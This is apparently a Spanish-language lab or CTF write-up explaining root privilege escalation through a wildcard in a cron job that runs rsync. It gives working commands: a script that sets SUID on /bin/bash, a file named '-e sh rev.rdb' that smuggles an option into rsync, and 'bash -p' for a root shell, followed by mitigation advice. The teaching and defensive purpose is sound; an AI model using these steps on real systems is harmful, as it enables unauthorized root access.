# Escalada de Privilegios – Abuso de Wildcards en `rsync`

### Descripción

El abuso de **wildcards** (`*`) en scripts que son ejecutados por **root** puede dar lugar a una escalada de privilegios si se combinan con herramientas inseguras como `rsync`.
Cuando un cron ejecuta `rsync` con patrones como `*.rdb`, un atacante puede **inyectar opciones maliciosas** para que se ejecuten comandos arbitrarios con privilegios elevados.

---

### Escenario

En este caso tenemos un **script ejecutado como root** mediante cron:

```bash
cd /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
rsync -a *.rdb rsync://backup:873/src/rdb/
cd / && rm -rf /var/www/html/*
rsync -a rsync://backup:873/src/backup/ /var/www/html/
chown www-data. /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
```

Puntos a destacar:

* El uso de `*.rdb` expande a **todos los archivos con esa extensión**.
* Si se manipula el nombre de los ficheros, podemos inyectar parámetros adicionales a `rsync`.
* El cron ejecuta este proceso como **root**, lo que nos da una vía de escalada.

---

### Explotación

1. Creamos un archivo malicioso con contenido que nos dé acceso como root:

```bash
cat <<EOF > rev.rdb
#!/bin/bash
chmod u+s /bin/bash
EOF
```

2. Le damos permisos de ejecución:

```bash
chmod +x rev.rdb
```

3. Creamos un archivo cuyo nombre sea interpretado como opción por `rsync`.
   En este caso, `-e sh rev.rdb` hará que `rsync` ejecute nuestro script:

```bash
touch -- '-e sh rev.rdb'
```

---

### ¿Qué ocurre?

* Cuando se ejecute el cron, el wildcard `*.rdb` se expandirá a:

  ```
  -e sh rev.rdb
  rev.rdb
  ```
* `rsync` interpretará `-e` como opción, y usará `sh rev.rdb` como comando remoto a ejecutar.
* Esto lanzará nuestro script `rev.rdb` con privilegios **root**.

---

### Post-Explotación

Tras la ejecución, `rev.rdb` ha marcado `/bin/bash` como **SUID root**:

```bash
ls -l /bin/bash
-rwsr-xr-x 1 root root 123456 sep  9 10:00 /bin/bash
```

Ahora podemos escalar privilegios fácilmente:

```bash
bash -p
```

---

### Mitigación

* Evitar el uso de **wildcards en scripts privilegiados**.
* Usar rutas absolutas y listas blancas de ficheros.
* Revisar permisos en cron jobs y tareas automáticas.
* Restringir opciones de `rsync` y no permitir que se ejecute con parámetros dinámicos no controlados.